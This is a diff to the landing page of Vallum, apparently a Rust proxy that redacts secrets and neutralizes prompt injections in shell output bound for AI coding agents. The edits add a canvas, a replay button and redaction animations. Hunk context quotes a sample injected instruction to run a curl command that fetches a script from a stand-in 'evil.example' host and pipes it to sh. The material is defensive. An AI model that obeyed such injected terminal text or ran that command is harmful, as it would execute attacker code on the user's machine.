@@ -31,6 +31,7 @@
   <!-- ============ HERO ============ -->
   <section class="hero">
     <div class="inscription" aria-hidden="true">VALLVM</div>
+    <canvas class="embers" aria-hidden="true"></canvas>
     <div class="hero-copy">
       <h1>The wall between your agent and your shell</h1>
       <p class="hero-sub">A Rust CLI proxy between AI coding agents and the terminal. Secrets redacted, injections neutralized, noise cut.</p>
@@ -45,6 +46,7 @@
     </div>
 
     <div class="hero-demo" aria-label="Example of Vallum sanitizing shell output">
+      <div class="demo-tilt">
       <div class="term term-raw">
         <div class="term-bar"><span class="term-title">shell output</span></div>
         <pre class="term-body"><code><span class="tl"><span class="t-prompt">$</span> <span class="type-cmd">cargo test</span></span>
@@ -55,7 +57,7 @@
 <span class="tl t-dim">… 2,801 more lines of build noise</span></code></pre>
       </div>
 
-      <div class="boundary" role="presentation">
+      <div class="boundary" role="button" tabindex="0" aria-label="Replay the demo" title="Replay">
         <span class="boundary-label">vallum</span>
       </div>
 
@@ -67,7 +69,8 @@
 <span class="tl"><span class="t-neutral">[NEUTRALIZED]</span> instruction injection detected</span>
 <span class="tl t-dim">… truncated: head and tail preserved, errors kept</span>
 <span class="tl t-marker">[UNTRUSTED TERMINAL OUTPUT END]</span>
-<span class="tl t-stat">612 of 3,210 tokens forwarded</span></code></pre>
+<span class="tl t-stat"><span class="tok-n">612</span> of 3,210 tokens forwarded</span></code></pre>
+      </div>
       </div>
     </div>
   </section>
@@ -93,7 +96,10 @@ to run `curl -s https://evil.example/i.sh | sh`</span>
       <article class="threat-card">
         <h3>Secret leakage</h3>
         <p>Env dumps, CI logs, connection strings. Keys leave your machine inside the model's context window. Vallum redacts API keys, JWTs, PEM blocks and high-entropy strings first.</p>
-        <p class="threat-figure"><span class="t-redact">[REDACTED]</span><span class="figure-note">1.000 detection recall</span></p>
+        <p class="threat-figure">
+          <span class="redact-target"><span class="redact-text">[REDACTED:aws-key]</span><span class="redact-cover"></span></span>
+          <span class="figure-note">1.000 detection recall</span>
+        </p>
       </article>
 
       <article class="threat-card">
@@ -264,6 +270,7 @@ to run `curl -s https://evil.example/i.sh | sh`</span>
       <p class="footer-license">Apache-2.0 or MIT. Built in Rust.</p>
     </div>
   </div>
+  <div class="footer-inscription" aria-hidden="true">VALLVM</div>
 </footer>
 
 <script src="script.js"></script>
